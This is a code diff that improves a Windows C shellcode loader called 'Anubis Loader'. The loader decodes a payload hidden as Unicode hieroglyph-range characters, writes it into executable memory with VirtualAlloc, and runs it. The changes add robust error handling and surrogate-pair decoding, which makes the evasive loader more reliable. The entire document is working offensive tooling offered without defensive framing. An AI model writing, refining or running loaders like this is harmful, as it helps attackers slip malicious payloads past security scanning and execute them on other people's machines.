@@ -5,11 +5,16 @@
 #include <stdint.h>
 
 int main(int argc, char* argv[]) {
-    printf("=== Anubis Loader ===\n");
+    if (argc != 2) {
+        printf("Usage: %s <encoded_file>\n", argv[0]);
+        return 1;
+    }
+    
+    printf("=== Anubis Loader - Simple ===\n");
     
     FILE* file = fopen(argv[1], "rb");
     if (!file) {
-        printf("[!] Failed to open file\n");
+        printf("[!] Failed to open file: %s\n", argv[1]);
         return 1;
     }
     
@@ -17,65 +22,137 @@ int main(int argc, char* argv[]) {
     long file_size = ftell(file);
     fseek(file, 0, SEEK_SET);
     
-    char* utf8_buffer = malloc(file_size + 1);
-    fread(utf8_buffer, 1, file_size, file);
-    utf8_buffer[file_size] = '\0';
+    if (file_size <= 0) {
+        printf("[!] Invalid file size\n");
+        fclose(file);
+        return 1;
+    }
+    
+    printf("[*] File size: %ld bytes\n", file_size);
+    
+    char* utf8_buffer = malloc(file_size);
+    if (!utf8_buffer) {
+        printf("[!] Failed to allocate memory for UTF-8 buffer\n");
+        fclose(file);
+        return 1;
+    }
+    
+    size_t bytes_read = fread(utf8_buffer, 1, file_size, file);
     fclose(file);
     
-    wchar_t* wide_buffer = malloc((file_size + 1) * sizeof(wchar_t));
-    MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, -1, wide_buffer, file_size + 1);
+    if (bytes_read != file_size) {
+        printf("[!] Failed to read entire file\n");
+        free(utf8_buffer);
+        return 1;
+    }
+    
+    int wide_chars = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, NULL, 0);
+    if (wide_chars <= 0) {
+        printf("[!] Failed to calculate wide character buffer size\n");
+        free(utf8_buffer);
+        return 1;
+    }
+    
+    wchar_t* wide_buffer = malloc(wide_chars * sizeof(wchar_t));
+    if (!wide_buffer) {
+        printf("[!] Failed to allocate memory for wide buffer\n");
+        free(utf8_buffer);
+        return 1;
+    }
+    
+    int converted = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, wide_buffer, wide_chars);
     free(utf8_buffer);
     
-    size_t len = 0;
-    for (wchar_t* p = wide_buffer; *p; ++p) {
-        if ((*p >= 0xD800) && (*p <= 0xDBFF)) {
-            ++p; // Skip low surrogate
-            len++; // Count surrogate pair as ONE byte
-        } else {
-            len++; // Count regular character as ONE byte
-        }
+    if (converted <= 0) {
+        printf("[!] Failed to convert to wide characters\n");
+        free(wide_buffer);
+        return 1;
     }
     
-    unsigned char* shellcode = malloc(len);
+    size_t shellcode_len = 0;
     const uint32_t base_unicode = 0x13000;
-    size_t shellcode_index = 0;
     
-    for (wchar_t* p = wide_buffer; *p; ++p) {
+    for (int i = 0; i < converted; i++) {
         uint32_t char_code;
-        if ((*p >= 0xD800) && (*p <= 0xDBFF)) {
-            wchar_t high_surrogate = *p;
-            ++p;
-            wchar_t low_surrogate = *p;
-            char_code = 0x10000 + ((high_surrogate & 0x3FF) << 10) + (low_surrogate & 0x3FF);
+        
+        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
+            (i + 1 < converted) && 
+            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
+            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
+            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
+            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
+            i++;
         } else {
-            char_code = (uint32_t)*p;
+            char_code = (uint32_t)wide_buffer[i];
         }
         
-        shellcode[shellcode_index] = (unsigned char)(char_code - base_unicode);
-        shellcode_index++;
+        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
+            shellcode_len++;
+        }
     }
     
-    printf("\n[*] Decoded %zu bytes\n", len);
-    printf("[*] Shellcode: ");
-    for (size_t i = 0; i < (len < 32 ? len : 32); i++) {
+    if (shellcode_len == 0) {
+        printf("[!] No valid shellcode bytes found\n");
+        free(wide_buffer);
+        return 1;
+    }
+    
+    printf("[*] Expected shellcode length: %zu bytes\n", shellcode_len);
+    
+    unsigned char* shellcode = malloc(shellcode_len);
+    if (!shellcode) {
+        printf("[!] Failed to allocate memory for shellcode\n");
+        free(wide_buffer);
+        return 1;
+    }
+    
+    size_t shellcode_index = 0;
+    for (int i = 0; i < converted && shellcode_index < shellcode_len; i++) {
+        uint32_t char_code;
+        
+        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
+            (i + 1 < converted) && 
+            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
+            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
+            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
+            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
+            i++;
+        } else {
+            char_code = (uint32_t)wide_buffer[i];
+        }
+        
+        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
+            shellcode[shellcode_index++] = (unsigned char)(char_code - base_unicode);
+        }
+    }
+    
+    free(wide_buffer);
+    
+    printf("[*] Decoded %zu bytes\n", shellcode_index);
+    printf("[*] First 32 bytes: ");
+    for (size_t i = 0; i < (shellcode_index < 32 ? shellcode_index : 32); i++) {
         printf("%02X ", shellcode[i]);
     }
-    printf("\n\n");
+    printf("\n");
     
     void* exec_mem = VirtualAlloc(NULL, shellcode_index, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        printf("[!] VirtualAlloc failed\n");
+        free(shellcode);
+        return 1;
+    }
+    
     memcpy(exec_mem, shellcode, shellcode_index);
     
-    DWORD old_protect;
-    VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &old_protect);
-    
+    printf("[*] Shellcode allocated at: %p\n", exec_mem);
     printf("[*] Press Enter to execute...");
     getchar();
     
+    // Simple execution
     void (*shellcode_func)() = (void (*)())exec_mem;
     shellcode_func();
     
     free(shellcode);
-    free(wide_buffer);
     VirtualFree(exec_mem, 0, MEM_RELEASE);
     
     return 0;
